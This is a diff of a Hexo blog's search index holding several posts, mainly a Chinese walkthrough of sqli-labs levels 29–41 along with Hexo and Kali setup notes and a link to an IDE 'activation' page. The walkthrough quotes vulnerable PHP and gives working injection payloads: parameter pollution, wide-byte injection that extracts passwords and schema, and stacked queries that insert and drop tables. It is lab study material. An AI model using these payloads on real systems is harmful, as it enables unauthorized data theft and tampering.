-    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
+    <title>hexo文章模板设置</title>
+    <url>/posts/2b14b1c3/</url>
+    <content><![CDATA[<p>打开hexo项目文件夹张的scaffold中的<code>post.md</code>和<code>draft.md</code>,并修改<br>对应的是 <code>hexo new &lt;title&gt;</code> 默认是<code>post</code>，草稿是<code>draft</code></p>
+<blockquote>
+<hr>
+<p>title: hexo文章模板设置<br>tags:<br>categories:<br>description:<br>date: 1616291706000</p>
+<hr>
+</blockquote>
 ]]></content>
       <categories>
         <category>Hexo</category>
       </categories>
       <tags>
         <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>idea激活</title>
+    <url>/posts/b49b0221/</url>
+    <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
+]]></content>
+      <categories>
+        <category>IDEA</category>
+      </categories>
+      <tags>
+        <tag>IDEA</tag>
       </tags>
   </entry>
   <entry>
@@ -2992,15 +2992,15 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>idea激活</title>
-    <url>/posts/b49b0221/</url>
-    <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
+    <title>hexo阅读全文设置</title>
+    <url>/posts/5605128/</url>
+    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
 ]]></content>
       <categories>
-        <category>IDEA</category>
+        <category>Hexo</category>
       </categories>
       <tags>
-        <tag>IDEA</tag>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -3080,19 +3080,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>kali配置双网卡</title>
-    <url>/posts/47c05aa1/</url>
-    <content><![CDATA[<br>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo  vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.2</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet static</span><br><span class="line">address 192.168.72.130</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;保存后</span><br><span class="line">sudo service networking  restart     </span><br><span class="line">ifconfig</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>log4j_rce利用</title>
     <url>/posts/5bd4bc7e/</url>
     <content><![CDATA[<p>程序在使用日志读取用户输入时，攻击者可以构造恶意代码${}</p>
@@ -3106,6 +3093,24 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       <tags>
         <tag>log4j</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>kali配置双网卡</title>
+    <url>/posts/47c05aa1/</url>
+    <content><![CDATA[<br>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo  vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.2</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet static</span><br><span class="line">address 192.168.72.130</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;保存后</span><br><span class="line">sudo service networking  restart     </span><br><span class="line">ifconfig</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpmyadmin漏洞复现(待完成)</title>
+    <url>/posts/89c61231/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>ntds.dit导出及解析</title>
@@ -3219,11 +3224,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       <tags>
         <tag>内网渗透</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>phpmyadmin漏洞复现(待完成)</title>
-    <url>/posts/89c61231/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>phpstudy访问localhost不出现目录的问题</title>
@@ -3771,6 +3771,97 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs3</title>
+    <url>/posts/14bd7516/</url>
+    <content><![CDATA[<h3 id="29-参数污染"><a href="#29-参数污染" class="headerlink" title="29 参数污染"></a>29 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//用`&amp;`分割字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//截取前两位字符</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用&amp;分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) 函数把字符串打散为数组。</span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line">string 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。可能的值：</span><br><span class="line">    大于 0 - 返回包含最多 limit 个元素的数组</span><br><span class="line">    小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组</span><br><span class="line">    0 - 返回包含一个元素的数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>对于<code>login.php?id=1&amp;id=2</code> apache(php)会解析最后一个参数，tomcat(jsp)会解析第一个参数，第一个<code>id</code>会经过<code>whitelist()</code>和<code>java_implimentation()</code></p>
+<p><code>whitelist()</code>作用是传入的参数必须是一位及以上的数字</p>
+<p><code>java_implimentation()</code>用<code>&amp;</code>分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</p>
+<p>参数污染 <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
+<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>可以参考<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
+<h3 id="30-参数污染"><a href="#30-参数污染" class="headerlink" title="30 参数污染"></a>30 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>和上一关差不多 双引号闭合</p>
+<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
+<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
+<h3 id="31-参数污染"><a href="#31-参数污染" class="headerlink" title="31 参数污染"></a>31 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
+<br>
+
+<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br>
+
+<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
+<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
+<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
+<p>在查字段名的时候需要把<code>&#39;users&#39;</code>转成16进制，16进制的表名不需要引号 <code>0x7573657273</code></p>
+<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
+<br>
+
+<h3 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33 宽字节注入"></a>33 宽字节注入</h3><p>和32一模一样</p>
+<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
+<br>
+
+<h3 id="34-宽字节注入-POST"><a href="#34-宽字节注入-POST" class="headerlink" title="34 宽字节注入(POST)"></a>34 宽字节注入(POST)</h3><p>过滤方式和上面的一样，可以使用burp直接传，不过POST传入数据时会进行url编码，</p>
+<p>在输入 <code>1%df or 1=1#</code>后抓包可以看到前面的<code>%df</code>变成了<code>%25df</code></p>
+<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>修改一下即可</p>
+<br>
+
+<br>
+
+<h3 id="35-宽字节注入"><a href="#35-宽字节注入" class="headerlink" title="35 宽字节注入"></a>35 宽字节注入</h3><p>和32差不多 只不过这里是字符型，不需要<code>&#39;</code>闭合</p>
+<p><code>?id=0 union select 1,database(),3</code></p>
+<br>
+
+<br>
+
+<h3 id="36-宽字节注入"><a href="#36-宽字节注入" class="headerlink" title="36 宽字节注入"></a>36 宽字节注入</h3><p>和前面一样</p>
+<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
+<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)–+</p>
+<br>
+
+<h3 id="37-宽字节注入-POST"><a href="#37-宽字节注入-POST" class="headerlink" title="37 宽字节注入(POST)"></a>37 宽字节注入(POST)</h3><p>和34一样</p>
+<br>
+
+<h3 id="38-堆叠注入"><a href="#38-堆叠注入" class="headerlink" title="38 堆叠注入"></a>38 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_store_result(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>mysqli_multi_query()</code>堆叠注入，多个查询用<code>;</code>分隔</p>
+<p>参考<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
+<p><code>?id=1&#39;;create table test like users --+</code></p>
+<p>发现数据库中新建了名的<code>test</code>的表</p>
+<p><code>?id=1&#39;;drop table test; --+</code>删除<code>test</code>表</p>
+<p>在<code>uers</code>表添加数据</p>
+<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+<br>
+
+<h3 id="39-堆叠注入"><a href="#39-堆叠注入" class="headerlink" title="39 堆叠注入"></a>39 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>数字型 不需要闭合</p>
+<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
+<br>
+
+<h3 id="40-堆叠注入"><a href="#40-堆叠注入" class="headerlink" title="40 堆叠注入"></a>40 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+<br>
+
+<h3 id="41-堆叠注入"><a href="#41-堆叠注入" class="headerlink" title="41 堆叠注入"></a>41 堆叠注入</h3><p><code>?id=2-1 --+</code>和<code>?id=1 --+</code>返回结果一样</p>
+<p>可以判断是数字型，和39一样</p>
+<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs2</title>
     <url>/posts/63ba4580/</url>
     <content><![CDATA[<h3 id="18-UA注入"><a href="#18-UA注入" class="headerlink" title="18 UA注入"></a>18 UA注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
@@ -3901,97 +3992,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
 <h3 id="28a-空格-union-select被过滤"><a href="#28a-空格-union-select被过滤" class="headerlink" title="28a */-/#/+/空格/union/select被过滤"></a>28a <code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
-]]></content>
-      <categories>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>SQLi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs3</title>
-    <url>/posts/14bd7516/</url>
-    <content><![CDATA[<h3 id="29-参数污染"><a href="#29-参数污染" class="headerlink" title="29 参数污染"></a>29 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//用`&amp;`分割字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//截取前两位字符</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用&amp;分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) 函数把字符串打散为数组。</span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line">string 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。可能的值：</span><br><span class="line">    大于 0 - 返回包含最多 limit 个元素的数组</span><br><span class="line">    小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组</span><br><span class="line">    0 - 返回包含一个元素的数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>对于<code>login.php?id=1&amp;id=2</code> apache(php)会解析最后一个参数，tomcat(jsp)会解析第一个参数，第一个<code>id</code>会经过<code>whitelist()</code>和<code>java_implimentation()</code></p>
-<p><code>whitelist()</code>作用是传入的参数必须是一位及以上的数字</p>
-<p><code>java_implimentation()</code>用<code>&amp;</code>分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</p>
-<p>参数污染 <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
-<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>可以参考<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
-<h3 id="30-参数污染"><a href="#30-参数污染" class="headerlink" title="30 参数污染"></a>30 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>和上一关差不多 双引号闭合</p>
-<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
-<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
-<h3 id="31-参数污染"><a href="#31-参数污染" class="headerlink" title="31 参数污染"></a>31 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
-<br>
-
-<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br>
-
-<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
-<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
-<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
-<p>在查字段名的时候需要把<code>&#39;users&#39;</code>转成16进制，16进制的表名不需要引号 <code>0x7573657273</code></p>
-<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
-<br>
-
-<h3 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33 宽字节注入"></a>33 宽字节注入</h3><p>和32一模一样</p>
-<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
-<br>
-
-<h3 id="34-宽字节注入-POST"><a href="#34-宽字节注入-POST" class="headerlink" title="34 宽字节注入(POST)"></a>34 宽字节注入(POST)</h3><p>过滤方式和上面的一样，可以使用burp直接传，不过POST传入数据时会进行url编码，</p>
-<p>在输入 <code>1%df or 1=1#</code>后抓包可以看到前面的<code>%df</code>变成了<code>%25df</code></p>
